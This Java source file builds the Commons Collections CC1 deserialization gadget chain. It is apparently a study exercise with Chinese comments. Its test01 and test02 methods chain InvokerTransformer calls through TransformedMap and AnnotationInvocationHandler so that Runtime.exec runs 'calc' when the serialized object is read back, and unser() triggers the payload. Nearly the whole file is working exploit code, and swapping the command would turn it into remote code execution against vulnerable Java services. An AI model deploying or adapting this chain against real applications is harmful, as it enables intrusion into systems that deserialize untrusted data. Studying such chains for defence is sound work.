package demo.cc.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Test02 {
    public static void main(String[] args) throws Exception{
        Test02 test02 = new Test02();
//        test02.test02();
        test02.unser();

    }

    public void test01() throws Exception{

//        Runtime.getRuntime().exec("calc.exe");
        Runtime runtime = Runtime.getRuntime();
////        runtime.exec("calc.exe");
//        //反射调用
//        Class cls = runtime.getClass();
//        Method m  = cls.getMethod("exec",String.class);
//        m.invoke(runtime,"calc.exe");

        Class rt = Class.forName("java.lang.Runtime");
//        Method getRuntime = rt.getDeclaredMethod("getRuntime",null);
//        Runtime r =(Runtime) getRuntime.invoke(null,null);
//        Method ex = rt.getMethod("exec",String.class);
//        ex.invoke("r","calc.exe");

        String methodName = "exec";
        Class[] paramTypes = new Class[]{String.class};
        Object[] args = new Object[]{"calc.exe"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(methodName, paramTypes, args);
//        invokerTransformer.transform(runtime);

        HashMap<Object,Object> map=new HashMap<>();
        map.put("value","123");
        Transformer keyTransformer = null;
        Transformer valueTransformer = invokerTransformer;

        Map<Object,Object> transformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);

//        for (Map.Entry entry:transformedMap.entrySet()){
//            entry.setValue(runtime);
        //反射获得AbstractInputCheckedMapDecorator类
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object obj = declaredConstructor.newInstance(Override.class,transformedMap);

        ser(obj);

    }
    public void test02() throws Exception{

        Class rc=Class.forName("java.lang.Runtime");
        Transformer[] Transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class), //添加此行代码，这里解决问题三
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer= new ChainedTransformer(Transformers);

        HashMap<Object,Object> map=new HashMap<>();
        map.put("value","123");

        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

//        for (Map.Entry entry:transformedMap.entrySet()){
//            entry.setValue(runtime);
        //反射获得AbstractInputCheckedMapDecorator类
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object obj = declaredConstructor.newInstance(Target.class,transformedMap);

        ser(obj);

    }

    public void ser(Object obj) throws Exception{
        FileOutputStream fos = new FileOutputStream("./data/test02cc1.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public void unser() throws Exception{
        FileInputStream fis = new FileInputStream("./data/test02cc1.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }



}

